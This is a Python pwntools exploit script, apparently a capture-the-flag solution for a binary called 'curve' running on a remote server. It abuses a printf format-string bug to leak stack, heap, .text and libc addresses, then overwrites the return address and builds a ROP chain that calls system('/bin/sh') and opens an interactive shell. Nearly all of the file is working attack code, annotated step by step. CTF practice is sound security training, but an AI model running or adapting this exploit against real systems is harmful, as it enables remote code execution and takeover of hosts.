#!/bin/python3

#   ########    #
#         #     #
#        #      #
#       #       #
#      #        #
#     #         #
#    #          #
#   ########    #

from pwn import *

SYSTEM_OFFSET = 0x22146 # distance from leaked libc address to system
RETURN_OFFSET = 0x21    # distance from leaked stack address to main return address
EVAL_OFFSET = 0x5b      # distance from leaked .text address to eval shell code
                        # eval shell is where shell code - 0x5f 0xc3 - exist, in asm
                        # - pop rdi
                        # - ret
                        # it's in __libc_csu_init for this case

STACK_LEAK_OFFSET = 0x50        # distance from input 1 to where a stack address leaks
HEAP_ADDRESS_LEAK_INDEX = 0x7   # an address of the heap is leaked
TEXT_ADDRESS_LEAK_INDEX = 0x16  # an address of the .text section is leaked with printf 
LIBC_ADDRESS_LEAK_INDEX = 0x1b  # an address of the libc library is leaked with printf

PRINTF_ALIGN_WITH_INPUT = 8     # where printf stack argument align with input 1 2

#io = process('./curve')
io = remote('143.198.127.103', 42004)

io.recvuntil(b'Input 1:\n')
payload = b''
payload += b'a'*(STACK_LEAK_OFFSET-1) # minus one for \n
io.sendline(payload)

io.recvuntil(b'\n') # clean the padded print
stacka_leak = io.recvuntil(b'\n') # now read the leaked address
stacka_leak = stacka_leak.rstrip() # clean it
stacka_leak = stacka_leak + b'\x00'*(8 - len(stacka_leak)) # pad it, unpack want 8 byte
stacka_leak = u64(stacka_leak) # here is the address
print('leaked stack address:', hex(stacka_leak))

main_ret_pointer = stacka_leak + RETURN_OFFSET
io.recvuntil(b'Input 2:\n')
payload = b''
payload += b'a'*(8*8) # push the pointer to the back in the stack for later used
payload += p64(main_ret_pointer) # put the pointer to the main return address in the stack to modify with printf 
io.send(payload)

io.recvuntil(b'Input 3:\n')
payload = b''
payload += b'111' # writing 3
payload += b'%%%d$hhn' % (PRINTF_ALIGN_WITH_INPUT + 8)
                                # format string of printf - want to modify return address with 03 ended from 0a
                                    # which will allow to come back to main
                                    # 8 is the index to the pointer in the input stack
payload += b' '
payload += b'%lx ' * 0x1b       # also wanted to leak the stack
heap_offset = len(payload)      # /bin/sh address will be calculated after heap address is leaked
payload += b'/bin/sh\x00'       # when system is called we need a string in the heap
io.send(payload)

leaks = io.recvuntil(b'\n') # printf leaks
leaks = leaks.split(b' ') 
libca_leak = leaks[LIBC_ADDRESS_LEAK_INDEX]
libca_leak = int(libca_leak, 16) # hex to int
print('leaked libc address:', hex(libca_leak))
texta_leak = leaks[TEXT_ADDRESS_LEAK_INDEX]
texta_leak = int(texta_leak, 16)
print('leaked .text address:', hex(texta_leak))
heapa_leak = leaks[HEAP_ADDRESS_LEAK_INDEX]
heapa_leak = int(heapa_leak, 16)
print('leaked heap address:', hex(heapa_leak))

## RETURN TO THE MAIN AGAIN
main_ret_pointer
eval_shell_address = texta_leak + EVAL_OFFSET
system_address = libca_leak + SYSTEM_OFFSET
bin_sh_address = heapa_leak + heap_offset # write "/bin/sh" here
## NOW WE HAVE EVERYTHING WE NEED
##
## *** PLAN ***
##
## ! build up the stack like -
##
## * main return address
## |    eval_address    |   *'/bin/sh'  |   system_address  |
## |  ret to evil shell |   pop to rdi  |   ret to system   |
##
## ! write the stack by 2 bytes each time to lower the printf bandwidth
## ! most significant 2 bytes seems to be alwarys zero
## ! desire stack -
##   main_ret_pointer   = (short)eval_shell_address
##   main_ret_pointer+2 = (short)eval_shell_address >> 2
##   main_ret_pointer+4 = (short)eval_shell_address >> 4
##
##   main_ret_pointer+8 = (short)bin_sh_address
##   main_ret_pointer+10 = (short)bin_sh_address >> 2
##   main_ret_pointer+12 = (short)bin_sh_address >> 4
##
##   main_ret_pointer+16 = (short)system_address
##   main_ret_pointer+18 = (short)system_address >> 2
##   main_ret_pointer+20 = (short)system_address >> 4

# ! difference between values have to be big enough 0x20 at least 
def write_stack(io, vmap):
    if len(vmap) != 4:
        print('! vmap length has to be 4')
        return
    vmap = sorted(vmap, key=lambda k: k[1])
    for i, (a, v) in enumerate(vmap):
        pad = (3-i)
        io.recvuntil(b'Input %d:\n' % (i%2+1))
        payload = b''
        payload += b'a'*(8*pad) # padding for later
        payload += p64(a)
        io.send(payload)

        # reloop to main
        if (i == 1):
            io.recvuntil(b'Input 3:\n')
            payload = b''
            payload += b'111' # to loop to main
            payload += b'%%%d$hhn' % (PRINTF_ALIGN_WITH_INPUT + 8) # remember the pointer in the back of stack 
            payload += b'\x00'
            io.send(payload)

    io.recvuntil(b'Input 3:\n')
    payload = b''
    payload += b'111' # to loop to main
    payload += b'%%%d$hhn' % (PRINTF_ALIGN_WITH_INPUT + 8) # remember the pointer in the back of stack 
    num_written = 3
    for i, (a, v) in enumerate(vmap):
        payload += b'%%%dd' % (v - num_written)
        payload += b'%%%d$hn' % (PRINTF_ALIGN_WITH_INPUT + (3-i)) # remember the pointer in the back of stack 
        num_written = v
    payload += b'\x00'
    print(payload)
    io.send(payload)

write_stack(io, [
    (main_ret_pointer+16, system_address >> 8*0 & 0xffff),
    (main_ret_pointer+18, system_address >> 8*2 & 0xffff),
    (main_ret_pointer+20, system_address >> 8*4 & 0xffff),
    (main_ret_pointer+20, 0x41), # just nothing
    ])
write_stack(io, [
    (main_ret_pointer+8, bin_sh_address >> 8*0 & 0xffff),
    (main_ret_pointer+10, bin_sh_address >> 8*2 & 0xffff),
    (main_ret_pointer+12, bin_sh_address >> 8*4 & 0xffff),
    (main_ret_pointer+12, 0x41), # just nothing
    ])

# ! stack ready
# ! jump upon into EVAL SHELL
write_stack(io, [
    (main_ret_pointer, eval_shell_address >> 8*0 & 0xffff),
    (main_ret_pointer+2, eval_shell_address >> 8*2 & 0xffff),
    (main_ret_pointer+4, eval_shell_address >> 8*4 & 0xffff),
    (main_ret_pointer+4, 0x41), # just nothing
    ])

io.interactive()
